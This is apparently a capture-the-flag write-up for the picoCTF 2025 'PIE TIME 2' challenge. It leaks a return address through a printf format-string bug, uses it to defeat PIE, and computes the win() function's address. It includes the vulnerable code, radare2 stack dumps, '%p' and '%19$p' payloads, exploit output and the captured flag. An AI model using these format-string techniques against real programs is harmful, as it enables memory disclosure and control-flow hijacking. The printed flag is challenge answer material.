# PIE TIME 2

At this time, the program doesn't expose the address of any functions.
However, since the `call_functions` function print the input directly, I can leak the address of some functions with format string attack.
```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
  ...

}
```

I analyzed at first which position any useful function address is.
```
$ r2 -d -A vuln
> pdf @ sym.call_functions
...
0x55c3e254d306      e855feffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)
0x55c3e254d30b      488d45b0       lea rax, [var_50h]
0x55c3e254d30f      4889c7         mov rdi, rax
0x55c3e254d312      b800000000     mov eax, 0
0x55c3e254d317      e824feffff     call sym.imp.printf     ; int printf(const char *format)
...

> db 0x55c3e254d317
> dc
Enter your name:hoge
INFO: hit breakpoint at: 0x55c3e254d317
```

After the program hit the breakpoint after I input `hoge`, I saw the stack.
In the `0x7fffa94e6f48` address, there is the address of the `main` function, which is the address after calling the `call_functions` function.
```
> pxr @ rsp
...
[0x55c3e254d317]> pxr @ rsp
0x7fffa94e6ee0 0x00007f2edd4f4ff0   .OO..... @ rsp
0x7fffa94e6ee8 ..[ null bytes ]..   00000000 
0x7fffa94e6ef0 0x0000000a65676f68   hoge.... @ rdi 44650950504
0x7fffa94e6ef8 0x00007f2edd398599   ..9.....
0x7fffa94e6f00 0x00007f2edd4f75c0   .uO.....
0x7fffa94e6f08 0x00007f2edd38f030   0.8.....
0x7fffa94e6f10 0x0000000000001000   ........ 4096
0x7fffa94e6f18 0x00007f2edd527000   .pR..... [vdso] library R 0x3010102464c457f
0x7fffa94e6f20 ..[ null bytes ]..   00000000 
0x7fffa94e6f28 0x00007fffa94e7068   hpN..... [stack] rbx stack R W 0x7fffa94e857a
0x7fffa94e6f30 0x00007fffa94e6f50   PoN..... [stack] stack R W 0x1
0x7fffa94e6f38 0x2cebdd0b1eb42600   .&.....,
0x7fffa94e6f40 0x00007fffa94e6f50   PoN..... @ rbp [stack] stack R W 0x1
0x7fffa94e6f48 0x000055c3e254d441   A.T..U.. /home/robot/Documents/picoctf/2025/pietime2/vuln .text main program R X 'mov eax, 0' 'vuln'
...

> pdf @ main
...
0x55c3e254d420      b900000000     mov ecx, 0
0x55c3e254d425      ba02000000     mov edx, 2
0x55c3e254d42a      be00000000     mov esi, 0
0x55c3e254d42f      4889c7         mov rdi, rax
0x55c3e254d432      e849fdffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)                                                                                                     
0x55c3e254d437      b800000000     mov eax, 0
0x55c3e254d43c      e886feffff     call sym.call_functions
0x55c3e254d441      b800000000     mov eax, 0
...
```

The address of the input is at the 8th position(`0x2070252041414141`).
```
$ ./vuln
Enter your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0x5610fafd82a1 0xfbad2288 0x1 0x5610fafd82db 0x4 0x7fa42c67aff0 (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7ffd000a7025 0x7ffdf705b740 0xf6c945a418e8b900 0x7ffdf705b740
```

The address of the `main` function after calling the `call_functions` function can be found at the 19th position.
```
(0x7fffa94e6f48-0x7fffa94e6ef0)/8 + 8 = 19

$ ./vuln
Enter your name:%19$p
0x557404e3d441
```

Then, I can calculate the address of the `win()` function.
```
0x557404e3d441-0x1441+0x136a
```

```
$ python exploit.py
[+] Opening connection to rescued-float.picoctf.net on port 53006: Done
[*] Leaked address: 0x5a6ba5888441
[*] Win address: 0x5a6ba588836a
[+] Receiving all data: Done (48B)
[*] Closed connection to rescued-float.picoctf.net port 53006
[*]  You won!
    picoCTF{p13_5h0u1dn'7_134k_e7fc8501}
```
